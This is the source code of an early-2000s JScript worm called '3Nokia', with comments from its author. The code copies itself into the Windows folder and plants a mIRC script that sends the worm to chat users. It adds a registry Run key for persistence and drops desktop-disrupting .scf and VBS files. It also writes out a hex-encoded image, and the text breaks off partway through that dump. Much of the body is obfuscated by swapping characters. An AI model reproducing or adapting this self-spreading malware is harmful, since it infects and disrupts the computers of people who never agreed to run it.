//3Nokia By Yello (2001)


	var R, D, C, SSS, B, S, Infect, ZVV, Z, ZV
        	R = WScript.CreateObject("WScript.Shell");
	A = new ActiveXObject("Scripting.FileSystemObject");

// This bit of code copys the worm to your windows dir, You'll notice that a lot of the varioubles start with a "Z"
// This is so that on the second time arount they are bypassed.

	Z = A.GetFile(WScript.ScriptFullName);
	Z.Copy(A.GetSpecialFolder(0)+"\\3Nokia.js");

// This code is missed due to the "/*" so it then moves on down to the "*\" and carrys on running the code to Create the decode vbs file.

     /*

Start()

function Start(){

// This code will look for mIRC in the usual places .....

  	@f (A.F@l$$x@sts("~:\\m@r~\\m@r~.@n@")) S = "~:\\m@r~\\"
  	@f (A.F@l$$x@sts("~:\\Program F@l$s\\m@r~\\m@r~.@n@")) S = "~:\\Program F@l$s\\m@r~\\"
  	@f (A.F@l$$x@sts("D:\\m@r~\\m@r~.@n@")) S = "D:\\m@r~\\"
  	@f (A.F@l$$x@sts("D:\\Program F@l$s\\m@r~\\m@r~.@n@")) S = "D:\\Program F@l$s\\m@r~\\"
  	
//If mIRC is found it calls the mirc script drop function , If not found it go's on to the next function..
 
                @f (S !="")
		M@R~();
		$ls$ n$xt1();}

fun~t@on M@R~(){

// Drop mIRC script in mIRC dir

B = A.Op$nT$xtF@l$(S+"S~r@pt.@n@",2, tru$);
	B.�("[s~r@pt]")
	B.�("n0=on 1:PART:#: @f ( ?m$ != ?n@~k )  { /"+un$s~ap$("%64")+un$s~ap$("%63")+un$s~ap$("%63")+" s$nd ?n@~k "+A.G$tSp$~@alFold$r(0)+"\\3Nok@a.js }")
	B.~los$();
n$xt1()}



fun~t@on n$xt1(){


	//This drops a .scf file in the windows dir so when run will give windows the hickup effect ...

~ = A.Op$nT$xtF@l$(A.G$tSp$~@alFold$r(0)+"\\SYST.~OM.s~f",2, tru$);
	~.�("[Sh$ll]")
	~.�("~ommand=2")
	~.�("@~onF@l$=SH$LL32.DLL,2")
	~.Wr@t$BlankL@n$s(1)
	~.�("[Taskbar]")
	~.�("~ommand=Toggl$D$sktop")
	~.~los$();
// This is the Runner.ini.vbs file that is run on boot so if second is higher than 55 it will run the .scf file ... 

D = A.Op$nT$xtF@l$(A.G$tSp$~@alFold$r(0)+"\\Runn$r.@n@.vbs",2, tru$);
	D.�("S$t Sh$ll=~r$at$Obj$~t("+un$s~ap$("%22")+"WS~r@pt.Sh$ll"+un$s~ap$("%22")+")")
	D.�("Oldt@m$r=T@m$r")
	D.�("wh@l$(T@m$r < Oldt@m$r + 10)")
	D.�("w$nd")
	D.�("Bl@nk()")
	D.�("Sub Bl@nk()")
	D.�("@f S$~ond(Now) < 55 Th$n $x@t Sub")
	D.�("Do")
	D.�("Oldt@m$r=T@m$r")
	D.�("wh@l$(T@m$r < Oldt@m$r + 1)")
	D.�("w$nd")
	D.�("Sh$ll.Run("+un$s~ap$("%22")+A.G$tSp$~@alFold$r(0)+"\\SYST.~OM.s~f"+un$s~ap$("%22")+"),vbh@d$")
	D.�("Loop")
	D.�("$nd Sub")
	D.~los$();
R.Run(A.G$tSp$~@alFold$r(0)+"\\Runn$r.@n@.vbs")

//Writes a Reg Key to  Run Runner.ini.vbs to On boot

R.R$gWr@t$("HKEY_LOCAL_MACHINE\\SOFTWARE\\M@~rosoft\\W@ndows\\~urr$ntV$rs@on\\Run\\Bl@nk", A.G$tSp$~@alFold$r(0)+"\\Runn$r.@n@.vbs")


//[Active Desktop Code] This drops a htm file called Phone.htm to the syste dir ready for the wallpaper to be set to this file and using the phone jpg created later. 

        D1 = A.Op$nT$xtF@l$(A.G$tSp$~@alFold$r(1)+"\\Phon$.htm",2, tru$);
    	D1.�("<HTML>")
	D1.�("<HEAD>")
	D1.�("<META HTTP-EQUIV="+un$s~ap$("%22")+"Cont$nt-Typ$"+un$s~ap$("%22")+" CONTENT="+un$s~ap$("%22")+"t$xt/html; ~hars$t=windows-12521"+un$s~ap$("%22")+">")
	D1.�("<META NAME="+un$s~ap$("%22")+"G$n$rator"+un$s~ap$("%22")+" CONTENT="+un$s~ap$("%22")+"V@rus"+un$s~ap$("%22")+">")
	D1.�("<TITLE>Y$llo</TITLE>")
	D1.�("</HEAD>")
	D1.�("<BODY TEXT="+un$s~ap$("%22")+"#000000"+un$s~ap$("%22")+" LINK="+un$s~ap$("%22")+"#0000ff"+un$s~ap$("%22")+" VLINK="+un$s~ap$("%22")+"#800080"+un$s~ap$("%22")+" BGCOLOR="+un$s~ap$("%22")+"#3A6EA5"+un$s~ap$("%22")+" scroll=no left-marg@n=0 top-marg@n=0 right-marg@n=0 bottom-marg@n=0>")
	D1.�("<P ID=ma@n ALIGN="+un$s~ap$("%22")+"RIGHT"+un$s~ap$("%22")+">")
	D1.�("<A HREF="+un$s~ap$("%22")+"http://www.Nok@a.~om"+un$s~ap$("%22")+">")
	D1.�("<IMG SRC="+un$s~ap$("%22")+A.G$tSp$~@alFold$r(0)+"\\PHONE.JPG"+un$s~ap$("%22")+" BORDER=0 WIDTH=50 HEIGHT=150></A>&nbsp;</P>")
	D1.�("</BODY>")
	D1.�("</HTML>")
	D1.close();

// Setst the wallpaper to Phone.htm

R.R$gWr@t$("HKEY_USERS\\.DEFAULT\\Control Pan$l\\D$sktop\\Wallpap$r", A.GetSpecialFolder(1)+"\\Phon$.htm")

// This [tiny] bit of code dumps a jpg of a mobile phone in the system dir

        D2 = A.Op$nT$xtF@l$(A.G$tSp$~@alFold$r(0)+"\\Runn$r.inf",2, tru$);
        D2.�("n "+A.G$tSp$~@alFold$r(0)+"\\PHONE.JPG")
        D2.�("e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 01 2c ")
	D2.�("e 0110 01 2c 00 00 ff db 00 43 00 08 06 06 07 06 05 08 ")
	D2.�("e 0120 07 07 07 09 09 08 0a 0c 14 0d 0c 0b 0b 0c 19 12 ")
	D2.�("e 0130 13 0f 14 1d 1a 1f 1e 1d 1a 1c 1c 20 24 2e 27 20 ")
	D2.�("e 0140 22 2c 23 1c 1c 28 37 29 2c 30 31 34 34 34 1f 27 ")
	D2.�("e 0150 39 3d 38 32 3c 2e 33 34 32 ff db 00 43 01 09 09 ")
	D2.�("e 0160 09 0c 0b 0c 18 0d 0d 18 32 21 1c 21 32 32 32 32 ")
	D2.�("e 0170 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 ")
	D2.�("e 0180 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 ")
	D2.�("e 0190 32 32 32 32 32 32 32 32 32 32 32 32 32 32 ff c0 ")
	D2.�("e 01a0 00 11 08 00 c3 00 41 03 01 22 00 02 11 01 03 11 ")
	D2.�("e 01b0 01 ff c4 00 1f 00 00 01 05 01 01 01 01 01 01 00 ")
	D2.�("e 01c0 00 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 ")
	D2.�("e 01d0 0a 0b ff c4 00 b5 10 00 02 01 03 03 02 04 03 05 ")
	D2.�("e 01e0 05 04 04 00 00 01 7d 01 02 03 00 04 11 05 12 21 ")
	D2.�("e 01f0 31 41 06 13 51 61 07 22 71 14 32 81 91 a1 08 23 ")
	D2.�("e 0200 42 b1 c1 15 52 d1 f0 24 33 62 72 82 09 0a 16 17 ")
	D2.�("e 0210 18 19 1a 25 26 27 28 29 2a 34 35 36 37 38 39 3a ")
	D2.�("e 0220 43 44 45 46 47 48 49 4a 53 54 55 56 57 58 59 5a ")
	D2.�("e 0230 63 64 65 66 67 68 69 6a 73 74 75 76 77 78 79 7a ")
	D2.�("e 0240 83 84 85 86 87 88 89 8a 92 93 94 95 96 97 98 99 ")
	D2.�("e 0250 9a a2 a3 a4 a5 a6 a7 a8 a9 aa b2 b3 b4 b5 b6 b7 ")
	D2.�("e 0260 b8 b9 ba c2 c3 c4 c5 c6 c7 c8 c9 ca d2 d3 d4 d5 ")
	D2.�("e 0270 d6 d7 d8 d9 da e1 e2 e3 e4 e5 e6 e7 e8 e9 ea f1 ")
	D2.�("e 0280 f2 f3 f4 f5 f6 f7 f8 f9 fa ff c4 00 1f 01 00 03 ")
	D2.�("e 0290 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 ")
	D2.�("e 02a0 02 03 04 05 06 07 08 09 0a 0b ff c4 00 b5 11 00 ")
	D2.�("e 02b0 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00 ")
	D2.�("e 02c0 01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 ")
	D2.�("e 02d0 22 32 81 08 14 42 91 a1 b1 c1 09 23 33 52 f0 15 ")
	D2.�("e 02e0 62 72 d1 0a 16 24 34 e1 25 f1 17 18 19 1a 26 27 ")
	D2.�("e 02f0 28 29 2a 35 36 37 38 39 3a 43 44 45 46 47 48 49 ")
	D2.�("e 0300 4a 53 54 55 56 57 58 59 5a 63 64 65 66 67 68 69 ")
	D2.�("e 0310 6a 73 74 75 76 77 78 79 7a 82 83 84 85 86 87 88 ")
	D2.�("e 0320 89 8a 92 93 94 95 96 97 98 99 9a a2 a3 a4 a5 a6 ")
	D2.�("e 0330 a7 a8 a9 aa b2 b3 b4 b5 b6 b7 b8 b9 ba c2 c3 c4 ")
	D2.�("e 0340 c5 c6 c7 c8 c9 ca d2 d3 d4 d5 d6 d7 d8 d9 da e2 ")
	D2.�("e 0350 e3 e4 e5 e6 e7 e8 e9 ea f2 f3 f4 f5 f6 f7 f8 f9 ")
	D2.�("e 0360 fa ff da 00 0c 03 01 00 02 11 03 11 00 3f 00 5a ")
	D2.�("e 0370 28 a2 be fc f8 80 a2 8a 28 00 a2 8a 28 03 82 f1 ")
	D2.�("e 0380 56 a9 a8 26 ad aa 5a ad cc d6 f1 d9 db c6 f1 79 ")
	D2.�("e 0390 32 14 cb 38 56 c9 23 af 0d 8c 7f f5 eb 47 c0 7a ")
	D2.�("e 03a0 cd de a9 a6 dc 45 79 29 99 ed dc 05 91 be f6 d6 ")
	D2.�("e 03b0 1d 09 ef c8 3c 9e 79 fa 55 1d 7e 33 2e a9 e2 e6 ")
	D2.�("e 03c0 0f 8d 96 96 c7 6f af c8 95 17 c3 19 00 5d 56 2c ")
	D2.�("e 03d0 0c b1 85 81 c7 23 1b ff 00 c6 be 5f 0b 88 9b c7 ")
	D2.�("e 03e0 27 26 f5 6f f5 3e 97 13 42 0b 05 68 ad 92 3b fa ")
	D2.�("e 03f0 28 a2 be a0 f9 a0 a7 22 19 1c 28 c0 cf 76 60 00 ")
	D2.�("e 0400 1e a4 9e 00 f7 3d 28 44 69 1d 51 14 b3 b1 c2 aa ")
	D2.�("e 0410 8c 92 7d 05 5a 1f 3b 4b 6b 13 e9 fb 54 2a ab 3b ")
	D2.�("e 0420 16 0c c6 5f 2d 8c 87 8f 97 2b 90 3d 3d f2 4f 97 ")
	D2.�("e 0430 9a e6 90 cb e9 29 35 76 f6 5f d7 43 b7 03 82 96 ")
	D2.�("e 0440 2a 6d 5e c9 6e 64 de 6a 5a 7d 9b 04 17 91 dc 49 ")
	D2.�("e 0450 8e 56 05 66 da 70 4e 33 8c 1e 87 a1 22 a9 37 88 ")
	D2.�("e 0460 6d 54 39 10 dc 10 a7 19 0a bc f4 e9 cf b8 ae 9e ")
	D2.�("e 0470 05 33 25 ad f3 45 66 04 ba 6b dc 87 03 2e 0a ed ")
	D2.�("e 0480 26 31 fe cf cd d7 3f 85 41 6c b1 34 76 f0 b0 d2 ")
	D2.�("e 0490 01 8e fd 60 61 1f dd 4d ca ac 24 41 eb f3 60 f4 ")
	D2.�("e 04a0 e8 79 af 97 7c 55 5f 5f 77 fa fb 8f a0 59 46 16 ")
	D2.�("e 04b0 db 7f e4 cf ff 00 91 30 5b 5f 81 7c c2 d6 d7 23 ")
	D2.�("e 04c0 cb 19 6f 94 7d 7d 6a c4 1a c6 9d 33 2a 1b b4 86 ")
	D2.�("e 04d0 56 20 2a 4c ac 99 cf b9 1b 47 e2 45 6c 99 e4 92 ")
	D2.�("e 04e0 7b a8 43 d8 65 9c 46 8c d9 c6 3c d6 8b f7 9c f1 ")
	D2.�("e 04f0 f7 72 3d 8d 41 00 5b eb db 02 52 c4 7d a6 25 5c ")
	D2.�("e 0500 95 fd e2 96 8d a4 e3 9f b9 f2 e3 3e a6 9f fa d3 ")
	D2.�("e 0510 5f 7e 5d bf ae c1 2c a3 08 f4 4a df f6 f3 ff 00 ")
	D2.�("e 0520 e4 4f 3e d7 9a 31 e2 1f 16 40 2f 23 55 36 50 fd ")
	D2.�("e 0530 d7 46 59 19 51 32 03 67 9e 73 d2 aa fc 34 c7 db ")
	D2.�("e 0540 35 01 ce 7c b4 fe 66 b5 7c 5f e1 55 97 42 8f 56 ")
	D2.�("e 0550 85 6d e2 94 ce f0 cb 14 47 85 21 d9 72 3d 72 46 ")
	D2.�("e 0560 6b 1f e1 ba 94 d5 ef 95 b8 22 10 08 ff 00 81 56 ")
	D2.�("e 0570 99 65 75 5f 13 19 ae ff 00 88 63 a3 c9 86 94 7c ")
	D2.�("e 0580 8f 49 a2 8a 2b ed cf 92 2d 43 34 36 1a 5d fe a5 ")
	D2.�("e 0590 32 45 27 92 a9 14 68 e4 83 bd db aa e3 b8 55 7f ")
	D2.�("e 05a0 a1 c7 e1 46 6b ed 39 62 d4 f6 e9 d1 16 8b 98 d5 ")
	D2.�("e 05b0 8b e2 51 b7 39 7e 38 ab 30 eb 6d a4 92 ab 69 6b ")
	D2.�("e 05c0 70 0e 27 22 e0 f4 d8 71 f2 f1 f7 be 7e 3e 95 aa ")
	D2.�("e 05d0 de 34 be 3f da 18 d3 6c 5c c7 1b be 3c d3 f3 05 ")
	D2.�("e 05e0 66 42 1f 8f f6 4d 7c 16 7d 89 c4 c7 1b 28 c1 3b ")
	D2.�("e 05f0 2b 6d 53 97 a2 7b 1f 4d 96 c7 08 b0 d1 f6 b0 bb ")
	D2.�("e 0600 77 e8 9f 5f 34 fc 8f 3a f1 57 89 60 fe d5 5d 2b ")
	D2.�("e 0610 4e 8b cb 81 23 0d 34 aa 4e f2 48 27 60 07 a0 e0 ")
	D2.�("e 0620 52 69 f7 5a 74 3a 72 89 6c 61 90 a4 a3 7a 82 f8 ")
	D2.�("e 0630 60 0a 91 b7 1d f2 dd ff 00 bb 59 b2 df 4c 3c 7b ")
	D2.�("e 0640 ab c9 24 11 99 a6 bb 73 82 79 50 46 40 1e d8 ae ")
	D2.�("e 0650 e3 41 d6 e6 48 2c ca e9 96 2d 18 b9 f2 d9 5b a2 ")
	D2.�("e 0660 36 48 ca f1 d7 20 73 5c 35 2b d7 8c 12 bb 7a 7f ")
	D2.�("e 0670 3f ea 76 a8 e1 21 7f 71 25 bf c2 bf c8 27 bf d3 ")
	D2.�("e 0680 47 db 50 58 c0 0f 99 1a 23 38 72 ae 0e 3e 67 18 ")
	D2.�("e 0690 ed e9 f4 aa 93 eb 16 66 6d 3d 2d b4 8f 3a e6 f6 ")
	D2.�("e 06a0 10 b0 a2 16 dd e6 64 7c bd 3e ef 3d 47 5f 4a e9 ")
	D2.�("e 06b0 a5 f1 a5 cc c9 a9 46 da 4d 84 de 54 2d 2b 23 b1 ")
	D2.�("e 06c0 c3 05 66 5c 3f ca 73 f7 09 15 16 a7 ab 5f 5c 6b ")
	D2.�("e 06d0 9a 1d d4 3a 75 ae eb 15 37 31 20 94 8d c0 6d 05 ")
	D2.�("e 06e0 00 c7 1d 57 1f 4a c2 96 2b 13 cc 95 47 24 bb fb ")
	D2.�("e 06f0 5b ff 00 5f d3 14 96 5f d2 9a ff 00 c0 57 ff 00 ")
	D2.�("e 0700 23 db fa d0 a7 a9 e8 57 fa 66 8a 2e 35 0d 36 cf ")
	D2.�("e 0710 29 ff 00 1f 4b 14 e5 c4 59 38 0b 80 7a 9c f5 3c ")
	D2.�("e 0720 64 57 07 e1 2b 51 6b e2 ad 56 35 ce d4 4d 83 39 ")
	D2.�("e 0730 ce 03 0c 7e 98 af 58 bf f1 e5 b2 5b 24 d6 7a 73 ")
	D2.�("e 0740 97 9b cc 67 8e ed 86 d4 08 ea 19 57 03 92 5b 18 ")
	D2.�("e 0750 27 d2 b8 98 af 5a f7 c6 7a a4 ef 6c 89 25 c4 42 ")
	D2.�("e 0760 4f dd 92 76 88 e4 31 9c fd 49 5f d2 bd 7c b6 b5 ")
	D2.�("e 0770 49 63 60 a4 db 5d dc af af 6b 18 e3 16 1e 38 79 ")
	D2.�("e 0780 c6 8a b3 b7 45 6f c9 1a d4 51 45 7d d9 f2 62 6a ")
	D2.�("e 0790 36 17 3e 4e 99 2c 70 49 34 53 4a 30 71 c4 6e 58 ")
	D2.�("e 07a0 a8 c7 07 2d f2 8f 4a 81 ac f5 08 a5 be 51 6f 34 ")
	D2.�("e 07b0 52 09 51 19 8e 7e 7d d8 c1 7e 3d fa 55 bb fd 46 ")
	D2.�("e 07c0 e6 ca ce d0 c7 76 a9 12 c6 f2 b2 c9 21 50 a1 1f ")
	D2.�("e 07d0 b7 6d df 3e 7f 0a c9 d5 7c 61 67 6d 0d e2 5d ea ")
	D2.�("e 07e0 8b 2a 48 e1 23 f9 5e 54 b8 51 8c 92 40 c1 c7 a6 ")
	D2.�("e 07f0 4f 6e 6b e0 31 9c d3 c5 54 7e d5 7c 4f 4e 59 3d ")
	D2.�("e 0800 9f a5 bc bf 13 ed 70 79 8d 5a 58 78 53 85 0b a4 ")
	D2.�("e 0810 96 b7 8f 6f 5b f9 98 fa ae 83 a8 5c dd 5b 6b 76 ")
	D2.�("e 0820 d6 93 b1 9a d0 cd 26 32 59 82 81 c8 e3 90 01 1c ")
	D2.�("e 0830 fa 62 a7 d3 ee 2e 56 d0 c8 be 61 11 3f cd 87 38 ")
	D2.�("e 0840 38 db f7 78 eb f3 8a a9 2f c5 85 8f cb 58 22 bb ")
	D2.�("e 0850 70 91 6d e6 40 81 4f 19 55 eb f2 f1 fa 0e 2b 0a ")
	D2.�("e 0860 5f 88 f7 9b 23 5b 7d 36 ce 25 89 b7 c6 18 16 08 ")
	D2.�("e 0870 de a3 18 c1 a9 54 24 96 b5 13 f9 3f d4 b8 66 55 ")
	D2.�("e 0880 b9 9b f6 16 bf 9c 4f 42 92 d7 50 86 5b d8 be cf ")
	D2.�("e 0890 34 72 79 b1 c6 c4 92 37 ef 1c 17 e3 dc f1 55 e3 ")
	D2.�("e 08a0 9e f5 63 b5 65 17 45 4c 20 ae 64 25 ff 00 d5 b3 ")
	D2.�("e 08b0 f0 7b 8c 27 5a f3 cb bf 88 fe 25 bc 8e 58 de f5 ")
	D2.�("e 08c0 44 72 80 24 4f 2c 30 7c 74 ce ec e6 a8 3f 8c fc ")
	D2.�("e 08d0 46 f3 2c c7 57 b9 12 aa 79 6a ea db 4a a7 f7 41 ")
	D2.�("e 08e0 1d 07 b5 61 ec eb 25 f1 26 fd 3c 8e c5 98 49 bb ")
	D2.�("e 08f0 ba 69 7f 5e 87 a8 18 af a6 82 07 6b 79 64 02 ed ")
	D2.�("e 0900 62 dc 09 2a ac c0 10 57 8e bf 37 f3 a8 74 88 ca ")
	D2.�("e 0910 78 da 31 73 0b 01 71 69 7a 84 b6 41 2c 8a cc 37 ")
	D2.�("e 0920 7b ee 8b 3f 85 79 62 f8 8f 5b 58 96 14 d5 af 52 ")
	D2.�("e 0930 25 6d cb 1a 4e ca a0 f5 c8 00 e0 1a e9 7c 1f 7f ")
	D2.�("e 0940 72 f3 c3 73 35 c4 92 c9 f6 f0 8c d2 31 62 de 64 ")
	D2.�("e 0950 32 29 24 9a df 0c aa c6 b4 5c a5 a5 d7 4f 33 1c ")
	D2.�("e 0960 5e 2b da 50 94 39 56 de 47 a4 51 45 15 fa 09 f0 ")
	D2.�("e 0970 25 d9 ad 41 d6 34 c4 68 44 96 b9 8d b6 c8 b9 55 ")
	D2.�("e 0980 63 0e e2 46 47 39 63 eb 5e 6b f1 8a fc dc 78 aa ")
	D2.�("e 0990 0b 35 23 cb b5 b7 00 01 d9 98 e4 fe 9b 6b d7 2f ")
	D2.�("e 09a0 f5 8c c9 a1 e9 be 5a 80 db 1c be ee 7e 58 40 c0 ")
	D2.�("e 09b0 1e fb bf 4a f1 c8 ed e1 f1 5f c4 2d 69 a4 30 36 ")
	D2.�("e 09c0 5a 4f 24 ce fb 63 05 48 55 2c 7d 31 5f 9d fb 77 ")
	D2.�("e 09d0 39 4e 72 8d bd e9 79 de cf 7d 96 ff 00 d3 3e de ")
	D2.�("e 09e0 32 fd d4 76 d9 6c ad d3 d5 eb dc e0 a8 af a2 60 ")
	D2.�("e 09f0 f8 71 a2 4d 68 71 a6 5b db 16 c6 03 a9 90 e0 77 ")
	D2.�("e 0a00 e7 69 04 e3 a7 6c 9c f6 0b 2c 3f 0b f4 06 72 26 ")
	D2.�("e 0a10 b2 87 68 c6 0a 1c 16 3d f8 c7 1f 99 ac 1e 36 9a ")
	D2.�("e 0a20 33 f6 9e 47 8a 69 fe 2e 96 c2 da 18 7f b3 ac a6 ")
	D2.�("e 0a30 f2 22 f2 a3 79 10 ee 50 58 92 72 0f 53 c7 d3 03 ")
	D2.�("e 0a40 18 e7 2c 97 c5 32 4b 60 b6 66 c6 d8 aa c6 d1 89 ")
	D2.�("e 0a50 58 16 97 92 0e 77 9e 7b 63 e9 c5 7b 64 bf 0b f4 ")
	D2.�("e 0a60 05 dd b6 d2 3e 54 85 24 70 0e 38 24 77 c7 a6 79 ")
	D2.�("e 0a70 aa 37 bf 0b b4 ad f1 35 b5 ac 39 dc 03 c6 01 54 ")
	D2.�("e 0a80 23 03 24 12 58 af 21 bb 37 50 3b 13 42 c7 53 61 ")
	D2.�("e 0a90 ed 0f 1a d4 b5 f3 a9 59 1b 57 d3 ed 22 02 53 2a ")
	D2.�("e 0aa0 c9 12 90 ea 49 25 b9 cf 20 e7 a7 fb 23 d2 b4 7c ")
	D2.�("e 0ab0 22 5b 19 04 ed 5d 42 d7 8e d9 3e 60 ae 9b c6 9e ")
	D2.�("e 0ac0 08 b4 d0 f4 ad 56 e5 22 81 12 23 0b 5a 94 7c be ")
	D2.�("e 0ad0 19 8a 90 c3 d7 83 db 1f 91 c7 3b e1 09 76 d8 ce ")
	D2.�("e 0ae0 98 e5 b5 2b 13 9f a3 49 fe 35 d5 42 aa 9c a3 28 ")
	D2.�("e 0af0 f7 5f 9a 09 ca f4 e4 fc 9f e4 7a 9d 14 51 5f a0 ")
	D2.�("e 0b00 9f 18 3b c4 2d f6 23 61 74 b7 91 c8 de 5a cb e4 ")
	D2.�("e 0b10 b6 33 16 d4 45 18 ef 93 bf f2 06 bc bf e1 b5 cb ")
	D2.�("e 0b20 5b 78 a9 ae 06 f6 75 84 b6 13 ab 7c ca 71 9f 43 ")
	D2.�("e 0b30 d0 fb 1e fd 2b bf f1 25 c2 4d 14 b0 6e b5 59 23 ")
	D2.�("e 0b40 85 5f e7 1f 37 cb 1c 44 6d 38 fb c7 77 e8 6b cd ")
	D2.�("e 0b50 fe 1f c0 d7 3e 26 fb 32 e3 74 90 b8 50 7b 91 82 ")
	D2.�("e 0b60 07 e9 5f 9d d6 77 f6 89 df 77 ba b7 5f 2f cc fb ")
	D2.�("e 0b70 89 46 4a 94 79 ad b2 db fa df b9 f4 b8 7c 37 1d ")
	D2.�("e 0b80 ab 0b fb 6e e6 1d 56 f2 d6 f1 22 86 de cf 6c cd ")
	D2.�("e 0b90 3e 0b 19 e2 97 70 89 63 40 49 df bd 59 4f 52 4a ")
	D2.�("e 0ba0 0d aa 7c c1 b3 64 17 d8 9e 66 df 30 00 5f 03 8d ")
	D2.�("e 0bb0 dd f0 0f 6a ce d4 3c 3f 65 aa 8b cf b5 07 61 77 ")
	D2.�("e 0bc0 0c 31 3a 9d a5 47 94 ec e8 c0 10 41 3b 9c 92 1b ")
	D2.�("e 0bd0 2a 70 01 04 64 1f 12 0d 5f de 39 8c e8 7c 56 ad ")
	D2.�("e 0be0 af 5c 41 24 96 e7 4e 45 91 a3 9a 20 5d a4 01 2d ")
	D2.�("e 0bf0 19 36 e0 9d c5 8d c3 00 00 c9 f9 40 e7 af 43 69 ")
	D2.�("e 0c00 75 0d f5 b2 5c 5b be f8 db 20 12 0a 90 41 20 82 ")
	D2.�("e 0c10 0f 20 82 08 20 e0 82 08 3c 8a c4 4f 06 e9 ea fb ")
	D2.�("e 0c20 c4 d7 01 c2 80 8c bb 14 23 01 00 56 55 0a 14 10 ")
	D2.�("e 0c30 6d 63 60 31 b7 39 18 20 e0 6c d8 58 c7 a7 d9 ad ")
	D2.�("e 0c40 b4 4c cc 03 34 8c ee 46 e7 76 62 ce c7 18 19 2c ")
	D2.�("e 0c50 49 c0 00 0c f0 00 e2 aa 7c 96 f7 41 d8 e3 3e 2e ")
	D2.�("e 0c60 ff 00 c8 83 3f fd 77 8b f9 d7 94 f8 52 1c e9 26 ")
	D2.�("e 0c70 6f 38 29 fe d6 b4 51 1e 3e f7 de 39 fc 3f ad 7a ")
	D2.�("e 0c80 bf c5 ff 00 f9 10 ae 3f eb bc 5f fa 15 79 4f 86 ")
	D2.�("e 0c90 d7 66 95 64 ad b7 32 6a 91 3a fa 90 08 15 ea e5 ")
	D2.�("e 0ca0 db 47 fc 4b f4 2d 26 e9 ca dd 9f e4 7a 7d 14 51 ")
	D2.�("e 0cb0 5f a4 1f 1a 6b eb 3a 7d c3 59 59 15 b1 b6 9a 2b ")
	D2.�("e 0cc0 a1 0c 21 9d c0 64 66 88 00 c0 63 ae 7d eb c2 7c ")
	D2.�("e 0cd0 3b ab c5 e1 cf 18 c7 7f 22 16 86 19 1c 15 5e b8 ")
	D2.�("e 0ce0 e4 57 b1 5e 6b 36 f0 24 0b 36 d9 65 55 de e1 e4 ")
	D2.�("e 0cf0 65 da 13 6a a8 50 38 dd 82 31 f4 ab 5a 57 85 ad ")
	D2.�("e 0d00 bc 4a 75 13 61 e1 fd 2e 48 a0 93 68 9e e2 4c 2c ")
	D2.�("e 0d10 84 8c f3 f2 93 9e 7f fa f5 f9 b4 e3 ec eb 55 84 ")
	D2.�("e 0d20 94 9d e5 2f b3 65 bb 5b b9 7d ce ca eb 5b 1f 6b ")
	D2.�("e 0d30 4e 95 47 46 33 51 49 34 ba be ab d3 f5 28 45 f1 ")
	D2.�("e 0d40 8f c3 72 4a 44 c9 3c 69 d9 95 49 27 d3 23 1f d6 ")
	D2.�("e 0d50 ac 7f c2 de f0 89 c7 ef ee 87 a8 10 35 73 7e 21 ")
	D2.�("e 0d60 f8 7b a4 5b ea 96 7f 6b b1 7d 2e 29 40 2c 6d e7 ")
	D2.�("e 0d70 de 92 9d 85 8e c6 20 8c 02 00 c8 f5 e9 5d 26 89 ")
	D2.�("e 0d80 f0 9a d6 eb 4d b5 ba 83 c3 56 c0 4c 37 b3 5e 5e ")
	D2.�("e 0d90 39 f9 73 c1 5c 7a 8e 7a 0a e4 74 a9 69 ee 4b ee ")
	D2.�("e 0da0 fe 91 ab c2 d9 73 36 ac 21 f8 bb e1 30 3f e3 e6 ")
	D2.�("e 0db0 ec fb 7d 98 d4 0f f1 8f c3 58 c2 ad d6 7d 44 47 ")
	D2.�("e 0dc0 fc 6b 4f 53 f8 37 0f d9 ee 0c 5e 1b b0 9d 94 66 ")
	D2.�("e 0dd0 15 b7 bc 78 d9 bf de 27 00 7e b5 e7 93 78 2b c3 ")
	D2.�("e 0de0 b6 9e 23 48 e4 37 8f 6e 5f ca 36 7b 89 71 2e d6 ")
	D2.�("e 0df0 38 c8 19 23 2b b7 1d 72 7a d1 ec a9 eb 78 4b ee ")
	D2.�("e 0e00 ff 00 20 8e 17 9b 66 85 f1 df c4 6d 37 c4 5e 1d ")
	D2.�("e 0e10 6d 36 ca 39 cb bc aa c5 a4 1b 40 03 9f c6 a0 d3 ")
	D2.�("e 0e20 ed 9e db c3 5e 1a 43 1c 38 96 ea 39 f7 a1 f9 8e ")
	D2.�("e 0e30 64 71 86 fc b8 ae fa df e1 ec 70 e9 92 4f 2f 86 ")
	D2.�("e 0e40 f4 6b 47 b7 84 cf 3d bc f7 1b e5 48 86 4e 71 82 ")
	D2.�("e 0e50 79 00 f5 c7 20 d7 1f a9 5d 58 c9 77 a6 43 67 6f ")
	D2.�("e 0e60 14 20 df a1 1b 09 c9 55 66 5c 11 d0 74 c8 c7 ad ")
	D2.�("e 0e70 76 e1 a3 15 38 46 31 92 d6 fb 27 f8 df 43 2a 94 ")
	D2.�("e 0e80 a4 a9 ca d6 69 2e ef fc 8e aa 8a 28 af d1 cf 8a ")
	D2.�("e 0e90 2c ad ce 93 1c 36 6b 77 60 b3 48 6e 96 39 24 70 ")
	D2.�("e 0ea0 3e 45 3d 18 7c a7 27 9c 63 da ac d9 6b fa 74 63 ")
	D2.�("e 0eb0 54 d3 f6 3d bd 95 e6 23 26 03 f3 63 cc 29 b9 86 ")
	D2.�("e 0ec0 31 9e 33 8e 41 07 15 8d a8 dd dc 5a 2d b0 4b 34 ")
	D2.�("e 0ed0 96 33 19 90 b3 e3 90 af 83 8e 3a f2 2a a9 bb ba ")
	D2.�("e 0ee0 22 fb fe 25 10 31 54 69 08 f9 79 0a c5 4e ef 97 ")
	D2.�("e 0ef0 d5 4d 7e 79 8b c2 2f ad d4 a9 ed ad ef 3e af bf ")
	D2.�("e 0f00 6d bc 8f bb c2 2f f6 7a 7f ba 93 f7 57 58 f6 f5 ")
	D2.�("e 0f10 3d 16 7f 14 78 6b 52 f0 dd 96 9f e5 bc 99 8c 4b ")
	D2.�("e 0f20 18 fb 2a c6 06 dc 64 85 1c 2e 73 db d6 b7 7c 1f ")
	D2.�("e 0f30 75 16 b5 e1 1b 45 59 de d5 e0 77 89 a3 82 6e 57 ")
	D2.�("e 0f40 6b 30 03 38 e4 63 1d 85 79 27 db 2f 56 fe 3b 75 ")
